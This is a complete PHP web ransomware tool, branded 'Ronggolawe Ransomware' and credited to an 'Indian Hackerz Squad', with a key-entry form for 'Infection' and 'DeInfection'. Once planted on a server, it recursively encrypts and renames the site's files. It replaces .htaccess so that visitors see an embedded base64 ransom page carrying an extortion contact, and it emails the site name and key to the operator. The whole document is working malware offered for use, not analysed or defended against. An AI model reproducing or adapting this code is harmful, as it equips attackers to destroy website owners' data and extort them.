<!DOCTYPE html>
<html>
<head>
   <title>RANSOMWARE FOR IHS</title>
<style type="text/css">
body {
    background: lightblue;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: grey;
    background-color: transparent;
    color: red;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htashor7cut")){
      rename(".htaccess", ".htashor7cut");
      if(fwrite(fopen('.htaccess', 'w'), "#Bug7sec Team\r\nDirectoryIndex shor7cut.php\r\nErrorDocument 404 /shor7cut.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("shor7cut.php", base64_decode("PCFET0NUWVBFIGh0bWw+DQo8aHRtbD4NCjxoZWFkPg0KICAgPHRpdGxlPlJBTlNPTVdBUkUgRk9SIElIUzwvdGl0bGU+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KYm9keSB7DQogICAgYmFja2dyb3VuZDogIzFBMUMxRjsNCiAgICBjb2xvcjogI2UyZTJlMjsNCn0NCmF7DQogICBjb2xvcjp5ZWxsb3c7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KPGJvZHk+DQo8Y2VudGVyPg0KPHByZT4NCiAgICAgIA0KICAgPGZvbnQgc2l6ZT00MD4gIPCdk5jwnZOd8J2Tk/Cdk5jwnZOQ8J2TnSDwnZOX8J2TkPCdk5LwnZOa8J2TlPCdk6HwnZOpIPCdk6LwnZOg8J2TpPCdk5DwnZOTPC9mb250Pg0KDQoNCllvdXIgc2l0ZSBpcyBsb2NrZWQsIHBsZWFzZSBjb250YWN0IHZpYSBlbWFpbDoNCiAgICAgLVsgPGZvbnQgY29sb3I9InJlZCI+aHR0cDovL2ZhY2Vib29rLmNvbS9iaWthc2gubWFsbGljay41MDcwPC9mb250PiBdLQ0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KVGhpcyBpcyBhIG5vdGljZSBvZiA8YSBocmVmPSJodHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9SYW5zb213YXJlIj5yYW5zb213YXJlPC9hPi48YnI+DQpIb3cgdG8gcmVzdG9yZSB0aGUgYmVnaW5uaW5nPw0KUGxlYXNlIGNvbnRhY3QgdXMgdmlhIGVtYWlsIGxpc3RlZA0KTm93IHlvdSBqdXN0IGhhdmUgdHdvIG9wdGlvbnMgbG9vc2UgeW91ciBhbGwgZGF0YSBieSBiZWluZyBhIGlkaW90IGFuZCB0cnlpbmcgdG8gcmVjb3ZlciB5b3Vyc2VsZiAgb3IgYnkgcGF5aW5nIHVzIA0KDQpDT05UQUNUIFVTIEFUIEdJVkVOIERFVEFJTCBBQk9WRS4NCg0KQXRsYXN0IGRvbid0IHRyeSB0byBiZSBvdmVyIHNtYXJ0Lg0KVGhhbmtzDQo8L3ByZT4NCjwvY2VudGVyPg0KPC9ib2R5Pg0KPC9odG1sPg=="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  shor7cut.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htashor7cut") ){
        if( unlink(".htaccess") && unlink("shor7cut.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> shor7cut.php (Default Page)<br>';
        }
        rename(".htashor7cut", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"AwesomeWare.php")  && deRanSomeware::kecuali($locate,".png")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"shor7cut.php") &&  deRanSomeware::kecuali($locate,"index.php") && deRanSomeware::kecuali($locate,".htashor7cut") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

   public function report($key){
        $message.= "=========     Ronggolawe Ransomware    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= Ronggolawe (2016) Ransomware =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Ransomware <ransomeware@shor7cut.today>\r\n";
        mail("-- YOUR EMAIL --",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".shor7cut");
        break;
        case '2':
          $locates = str_replace(".shor7cut", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Locked</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Unlock</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<pre>

   <font size=20> 𝓘𝓝𝓓𝓘𝓐𝓝 𝓗𝓐𝓒𝓚𝓔𝓡𝓩 𝓢𝓠𝓤𝓐𝓓</font>
        



 <font color=¨black¨>-[ Contact : http://facebook.com/bikash.mallick.5070 ]-</font>
</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="KEY ENC/DEC">
      <select name="method" class="selecte">
         <option value="1">Infection</option>
         <option value="2">DeInfection</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>
<?php
}?>
</div>
</body>
</html>


<?php

?>
